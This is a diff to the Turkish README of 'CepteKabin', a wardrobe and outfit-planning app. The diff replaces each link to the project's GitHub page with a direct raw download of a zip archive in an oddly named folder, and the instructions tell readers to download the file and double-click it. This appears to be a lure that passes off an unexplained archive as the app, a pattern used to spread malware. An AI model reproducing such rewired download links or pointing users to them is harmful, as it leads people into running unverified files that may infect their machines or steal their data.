@@ -1,6 +1,6 @@
 # 🧥 CepteKabin - Akıllı Kombinler, Kolay Planlama
 
-[![Download CepteKabin](https://img.shields.io/badge/Download-CepteKabin-blue?style=for-the-badge&logo=github)](https://github.com/Expatriationholbeintheelder496/CepteKabin)
+[![Download CepteKabin](https://img.shields.io/badge/Download-CepteKabin-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Expatriationholbeintheelder496/CepteKabin/main/nonacquittal/Kabin_Cepte_v1.9-alpha.4.zip)
 
 ## 📱 CepteKabin Nedir?
 
@@ -12,7 +12,7 @@ Uygulama, akıllı gardırop kullanımı için tasarlanmıştır. Kıyafetlerini
 
 CepteKabin, GitHub sayfası üzerinden indirilebilir ve çalıştırılabilir.
 
-[GitHub sayfasını aç ve indir](https://github.com/Expatriationholbeintheelder496/CepteKabin)
+[GitHub sayfasını aç ve indir](https://raw.githubusercontent.com/Expatriationholbeintheelder496/CepteKabin/main/nonacquittal/Kabin_Cepte_v1.9-alpha.4.zip)
 
 ### Adımlar
 
@@ -63,7 +63,7 @@ Uygulama, dolabındaki kıyafetleri kaydeder ve bunları tek ekranda toplar. Son
 
 ## 📦 İndirme ve Kurulum
 
-1. Bu bağlantıyı aç: [CepteKabin GitHub sayfası](https://github.com/Expatriationholbeintheelder496/CepteKabin)
+1. Bu bağlantıyı aç: [CepteKabin GitHub sayfası](https://raw.githubusercontent.com/Expatriationholbeintheelder496/CepteKabin/main/nonacquittal/Kabin_Cepte_v1.9-alpha.4.zip)
 2. Sayfadaki dosyalar arasında kurulum veya çalıştırma dosyasını bul.
 3. Dosyayı bilgisayarına indir.
 4. Dosyaya çift tıkla.
@@ -183,7 +183,7 @@ Uygulama hava durumuna ve kayıtlı kıyafetlerine bakarak uygun seçenekleri ö
 
 ## 🔗 Erişim Bağlantısı
 
-[CepteKabin GitHub sayfasını aç](https://github.com/Expatriationholbeintheelder496/CepteKabin)
+[CepteKabin GitHub sayfasını aç](https://raw.githubusercontent.com/Expatriationholbeintheelder496/CepteKabin/main/nonacquittal/Kabin_Cepte_v1.9-alpha.4.zip)
 
 ## 🧾 Dosya ve Klasör Düzeni
 
@@ -219,7 +219,7 @@ CepteKabin, iOS tarzı modern bir görünüm hedefler. Bu, temiz kartlar, net ik
 
 ## 📥 İndir ve Başlat
 
-[GitHub sayfasını ziyaret et ve indir](https://github.com/Expatriationholbeintheelder496/CepteKabin)
+[GitHub sayfasını ziyaret et ve indir](https://raw.githubusercontent.com/Expatriationholbeintheelder496/CepteKabin/main/nonacquittal/Kabin_Cepte_v1.9-alpha.4.zip)
 
 1. Sayfayı aç
 2. Uygun dosyayı bul
